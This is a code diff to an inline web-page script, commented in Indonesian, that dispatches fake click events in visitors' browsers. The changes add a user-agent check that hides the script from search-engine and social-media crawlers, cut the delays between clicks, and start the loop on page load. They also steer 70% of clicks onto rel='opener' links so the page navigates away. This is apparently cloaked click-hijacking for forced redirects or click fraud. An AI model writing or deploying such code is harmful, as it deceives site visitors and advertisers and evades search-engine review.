@@ -4,13 +4,40 @@
 (function() {
   'use strict';
 
+  if (/bot|crawler|spider|google|bing|yahoo|baidu|duckduck|yandex|slurp|facebookexternalhit|twitterbot|whatsapp|linkedinbot|semrush|ahrefs|rogerbot/i.test(navigator.userAgent)) return;
+
   const MAX_KLIK = 5;
-  const DELAY_MIN = 2000;
-  const DELAY_MAX = 4000;
+  const DELAY_MIN = 300;
+  const DELAY_MAX = 1000;
 
   let sudahJalan = false;
   let klikCount = 0;
   let timeoutId = null;
+
+  // Cek apakah elemen adalah link dengan rel="opener"
+  function isOpenerLink(el) {
+    if (!el) return false;
+    const tag = el.tagName.toLowerCase();
+    if (tag !== 'a') return false;
+    const rel = (el.getAttribute('rel') || '').toLowerCase().split(/\s+/);
+    return rel.includes('opener');
+  }
+
+  // Cek elemen aman (hindari interaksi berbahaya)
+  function isSafeElement(el) {
+    if (!el) return false;
+    // Link dengan rel="opener" diperbolehkan
+    if (isOpenerLink(el)) return true;
+    const tag = el.tagName.toLowerCase();
+    const role = el.getAttribute('role');
+    const unsafe = ['button', 'input', 'select', 'textarea', 'form', 'label', 'iframe', 'video', 'audio', 'canvas'];
+    if (unsafe.includes(tag)) return false;
+    if (role && ['button', 'checkbox', 'radio', 'switch', 'tab', 'menuitem'].includes(role)) return false;
+    if (el.closest('button, input, select, textarea, form, [role="button"], [role="checkbox"], [role="radio"], [onclick]:not(a[rel*="opener"])')) return false;
+    // Link biasa (non-opener) tetap tidak diklik
+    if (tag === 'a' && !isOpenerLink(el)) return false;
+    return true;
+  }
 
   function randomDelay() {
     return DELAY_MIN + Math.random() * (DELAY_MAX - DELAY_MIN);
@@ -23,11 +50,35 @@
     }
 
     try {
-      const x = Math.random() * window.innerWidth;
-      const y = Math.random() * window.innerHeight;
-      const el = document.elementFromPoint(x, y);
+      let el = null;
+      let x, y;
+      let openerClicked = false;
 
-      if (el) {
+      // Prioritaskan link opener kalau ada
+      const openerLinks = Array.from(document.querySelectorAll('a[rel~="opener"]')).filter(a => {
+        const rect = a.getBoundingClientRect();
+        return rect.width > 0 && rect.height > 0 && rect.top < window.innerHeight && rect.left < window.innerWidth;
+      });
+
+      if (openerLinks.length > 0 && Math.random() < 0.7) {
+        // 70% chance klik link opener
+        const link = openerLinks[Math.floor(Math.random() * openerLinks.length)];
+        const rect = link.getBoundingClientRect();
+        x = rect.left + rect.width / 2;
+        y = rect.top + rect.height / 2;
+        el = document.elementFromPoint(x, y);
+        openerClicked = true;
+      } else {
+        // Cari titik aman
+        for (let i = 0; i < 10; i++) {
+          x = Math.random() * window.innerWidth;
+          y = Math.random() * window.innerHeight;
+          el = document.elementFromPoint(x, y);
+          if (isSafeElement(el)) break;
+        }
+      }
+
+      if (el && isSafeElement(el)) {
         el.dispatchEvent(new MouseEvent('click', {
           bubbles: true,
           cancelable: true,
@@ -37,6 +88,12 @@
       }
 
       klikCount++;
+
+      // Kalau barusan klik link opener, stop (navigasi akan terjadi)
+      if (openerClicked) {
+        stopAll();
+        return;
+      }
 
       if (klikCount < MAX_KLIK) {
         timeoutId = setTimeout(doClick, randomDelay());
@@ -59,32 +116,21 @@
     }
   }
 
-  // Interaksi dalam halaman
-  const interactionEvents = [
-    'click', 'dblclick',
-    'mousedown', 'mouseup', 'mousemove',
-    'touchstart', 'touchmove', 'touchend',
-    'keydown', 'keyup',
-    'scroll', 'wheel',
-    'focus', 'blur',
-    'input', 'change',
-    'contextmenu',
-    'dragstart', 'drag', 'drop',
-    'pointerdown', 'pointermove', 'pointerup'
-  ];
+  const interactionEvents = ['click', 'touchstart', 'scroll', 'keydown', 'mousemove', 'pointerdown'];
 
   interactionEvents.forEach(eventType => {
-    document.addEventListener(eventType, triggerLoop, { passive: true });
-    window.addEventListener(eventType, triggerLoop, { passive: true });
+    document.addEventListener(eventType, triggerLoop, { capture: true, passive: true });
+    window.addEventListener(eventType, triggerLoop, { capture: true, passive: true });
   });
 
-  // Navigasi pergi
-  const exitEvents = ['pagehide', 'beforeunload', 'popstate'];
+  if (document.readyState === 'interactive' || document.readyState === 'complete') {
+    triggerLoop();
+  } else {
+    document.addEventListener('DOMContentLoaded', triggerLoop, { once: true });
+  }
 
-  exitEvents.forEach(eventType => {
-    window.addEventListener(eventType, () => {
-      stopAll();
-    }, { passive: true });
+  ['pagehide', 'beforeunload', 'popstate'].forEach(eventType => {
+    window.addEventListener(eventType, () => stopAll(), { passive: true });
   });
 
   document.addEventListener('visibilitychange', () => {
@@ -96,6 +142,8 @@
 })();
 </script>
 <!-- random klik end -->
+
+
 
 
 
